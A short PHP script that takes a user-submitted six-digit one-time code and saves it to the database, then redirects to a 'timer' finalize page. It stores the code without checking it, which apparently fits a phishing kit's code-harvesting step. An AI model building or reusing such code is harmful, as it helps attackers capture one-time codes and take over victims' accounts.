<?php
// Include the connection file
include '../connection/connection.php';
session_start();

// Ensure user_id is retrieved from the session so it saves on the correct row
if (!isset($_SESSION['user_id'])) {
    header('Location: ../index.php'); // Redirect to the login page if user_id is not set
    exit();
}

try {
    $user_id = $_SESSION['user_id'];

    // Sanitize and validate the OTP input (assuming OTP is a numeric value)
    if (empty($_POST['otp']) || !preg_match('/^\d{6}$/', $_POST['otp'])) {
        echo "Error: Invalid OTP code. Please enter a valid 6-digit code.";
        exit();
    }
    $otp = $_POST['otp'];

    // Prepare and execute the SQL statement to save the OTP
    $stmt = $pdo->prepare("UPDATE users SET otp_code = ? WHERE id = ?");
    if ($stmt->execute([$otp, $user_id])) {

        // On successful entry in the database, redirect to the next processing page
        
        header('Location: ../timer/finalize.php');
        exit();
    } else {
        echo "Error: Unable to save OTP code. Please try again.";
    }
} catch (PDOException $e) {
    // Log error and display a user-friendly message
    error_log($e->getMessage()); // Log error to a file or monitoring system
    echo "An error occurred while processing your request. Please try again.";
}
